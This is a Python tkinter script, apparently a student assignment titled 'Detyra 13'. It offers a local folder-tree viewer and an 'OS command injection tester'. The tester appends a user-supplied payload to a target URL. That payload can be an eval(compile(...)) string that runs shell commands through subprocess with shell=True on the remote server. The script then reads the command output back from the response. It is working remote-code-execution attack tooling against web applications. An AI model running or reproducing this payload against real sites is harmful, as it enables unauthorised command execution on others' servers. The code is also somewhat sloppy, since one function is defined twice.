from tkinter import *
import os
from tkinter import ttk
from typing import Any, Union
from bs4 import BeautifulSoup as Soup
import requests


def fill_tree(treeview, node):
    if treeview.set(node, "type") != 'directory':
        return
    path = treeview.set(node, "fullpath")
    treeview.delete(*treeview.get_children(node))

    for p in os.listdir(path):
        p = os.path.join(path, p)
        ptype = None
        if os.path.isdir(p):
            ptype = 'directory'

        fname = os.path.split(p)[1]
        oid = treeview.insert(node, 'end', text=fname, values=[p, ptype])
        if ptype == 'directory':
            treeview.insert(oid, 0, text='dummy')


def Take_input(inputurl, inputpayload, output):
    url = inputurl.get("1.0", "end-1c")
    payload = inputpayload.get("1.0", "end-1c")
    target = str(url) + payload
    try:
        results = requests.get(url=target)
        if "www-data" in str(results.text):
            output.insert(END, 'OS Command Injection Successfully!')
        else:
            output.insert(END, "Nothing Found!")
    except ConnectionError:
        print("Connection Error. Try Again.")


def update_tree(event):
    treeview = event.widget
    fill_tree(treeview, treeview.focus())


def create_root(treeview, startpath):
    dfpath = os.path.abspath(startpath)
    node = treeview.insert('', 'end', text=dfpath,
                           values=[dfpath, "directory"], open=True)
    fill_tree(treeview, node)


def show_tree():
    newWindow = Toplevel(master)
    newWindow.title("Host Tree Structure")
    newWindow.geometry("500x500")
    treeview = ttk.Treeview(newWindow, columns=(
        "fullpath", "type"), displaycolumns='')
    treeview.pack(fill='both', expand=True)
    create_root(treeview, '.')
    treeview.bind('<<TreeviewOpen>>', update_tree)


def Take_input(inputurl, inputpayload, inputexpression, output):
    url = inputurl.get("1.0", "end-1c")
    # payload = inputpayload.get("1.0", "end-1c")
    # expression = inputexpression.get("1.0", "end-1c")

    try:
        if inputpayload.get("1.0", END) == "\n":
            payload = inputexpression.get("1.0", "end-1c")
            site_request = requests.get(str(url) + str(payload))
        else:
            payload = inputpayload.get("1.0", "end-1c")
            example = ("eval(compile(\"\"\"f"
                       "or x in range(1):\\n"
                       " import subprocess\\"
                       "n subprocess.check_o"
                       f"utput(r\'{payload}\',s"
                       "hell=True)\"\"\",\'"
                       "\',\'single\'))").format(payload)
            site_request = requests.get(str(url) + example)
        site_response = str(site_request.content)
        soup = Soup(site_response, "html.parser")
        output.insert(END, soup.find('strong').text + '\n')
    except ConnectionError:
        print("Connection Error. Try Again.")


def os_injection():
    root = Toplevel(master)
    root.title("Os command injection")
    root.geometry("900x500")

    l1 = Label(root, text="Enter the payload (e.g whoami,pwd,ls -al)",
               fg="grey",
               )
    inputtxt1 = Text(root,
                     height=0,
                     width=25,
                     bg="light yellow")

    example = ("eval(compile(\"\"\"f"
               "or x in range(1):\\n"
               " import subprocess\\"
               "n subprocess.check_o"
               "utput(r\'COMMAND\',s"
               "hell=True)\"\"\",\'"
               "\',\'single\'))")

    l2 = Label(root, text=f"Or enter the full expression \n(e.g {example})",
               fg="grey",
               )

    inputtxt2 = Text(root,
                     height=3,
                     width=95,
                     bg="light yellow")

    Output = Text(root, height=10,
                  width=100,
                  bg="light cyan")

    Display = Button(root, height=2,
                     width=12,
                     text="Test",
                     command=lambda: Take_input(inputtxt, inputtxt1, inputtxt2, Output))

    OPTIONS = [
        "Payload",
        "Expression",
    ]  # etc

    variable = StringVar(root)
    variable.set(OPTIONS[0])  # default value

    w = OptionMenu(root, variable, *OPTIONS)
    w.pack()

    def ok():
        if variable.get() == "Payload":
            l1.pack()
            inputtxt1.pack(pady=10)
            Display.pack(pady=10)
            Output.pack()
            w.destroy()
            button.destroy()
        else:
            l2.pack()
            inputtxt2.pack(pady=10)
            Display.pack(pady=10)
            Output.pack()
            w.destroy()
            button.destroy()

    button = Button(root, text="Choose method", command=ok)
    button.pack()
    # button = Button(root, text="Choose method", command=ok)
    # button.pack()

    l = Label(root, text="Enter the url like this \nschema://subdomain.domain.tld/path?parameter=",
              fg="grey",
              )
    inputtxt = Text(root,
                    height=0,
                    width=55,
                    bg="light yellow")
    l.pack()
    inputtxt.pack(pady=10)


if __name__ == '__main__':
    master = Tk()
    master.geometry("300x310")
    master.title("Detyra 13")
    label = Label(master,
                  text="Menu \n Choose the function",
                  fg="white",
                  bg="black",
                  width=50, )

    label.pack(pady=10)

    btn = Button(master,
                 text="HOST FOLDER TREE STRUCTURE", bg="green",
                 width=30,
                 height=5,
                 command=show_tree)

    btn1 = Button(master, bg="red",
                  width=30,
                  height=5,
                  text="OS COMMAND INJECTION TESTER",
                  command=os_injection)

    btn.pack(pady=10)
    btn1.pack(pady=10)
    mainloop()